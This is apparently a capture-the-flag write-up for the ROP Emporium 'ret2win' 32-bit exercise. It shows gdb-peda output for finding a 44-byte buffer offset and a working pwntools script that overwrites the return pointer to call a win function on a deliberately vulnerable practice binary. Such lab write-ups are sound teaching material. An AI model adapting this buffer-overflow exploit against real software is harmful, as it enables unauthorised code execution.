# ret2win - 32bit

This challenge just involve a very simple overwritting of the return pointer to a function of our choice.

After looking inside the binary a function called `ret2win` that will print us our flag.

All we have to do is find the vulnerable buffer len and place the address of `ret2win` to exploit the binary.

Using `gdb` we can use the `pattern` functionality to find the buffer len:

```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

```
gdb-peda$ r
Starting program: /root/GitHub/ROP_Emporium/0x00_ret2win/32-bit/ret2win32 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3a0 ("'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAA")
EBX: 0x0 
ECX: 0xf7fad89c --> 0x0 
EDX: 0xffffd3a0 ("'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAA")
ESI: 0xf7fac000 --> 0x1d9d6c 
EDI: 0xf7fac000 --> 0x1d9d6c 
EBP: 0x30414161 ('aAA0')
ESP: 0xffffd3d0 --> 0xf7fe0041 (sub    DWORD PTR [edi],ecx)
EIP: 0x41464141 ('AAFA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41464141
[------------------------------------stack-------------------------------------]
0000| 0xffffd3d0 --> 0xf7fe0041 (sub    DWORD PTR [edi],ecx)
0004| 0xffffd3d4 --> 0xffffd3f0 --> 0x1 
0008| 0xffffd3d8 --> 0x0 
0012| 0xffffd3dc --> 0xf7decb41 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd3e0 --> 0xf7fac000 --> 0x1d9d6c 
0020| 0xffffd3e4 --> 0xf7fac000 --> 0x1d9d6c 
0024| 0xffffd3e8 --> 0x0 
0028| 0xffffd3ec --> 0xf7decb41 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$
```

Then we use the value at the bottom (`0x41414641 in ?? ()`) in with pattern to find the value.

```
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
```

Then finding the address of `ret2win` and adding to the end of the junk we pass in.

The gives us this exploit:

```python
import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "ret2win32"
BUFFER_LEN = 44

io = process(f"./{BINARY_NAME}")

junk = b"\x90" * BUFFER_LEN

# Pointers
win_addr = p32(0x08048659)

# Payload creation
payload = b""
payload += junk
payload += win_addr

io.recvuntil("> ")
io.send(payload)
io.send("\n")
shared_pwn._recvall(io)
```

That prints us the flag!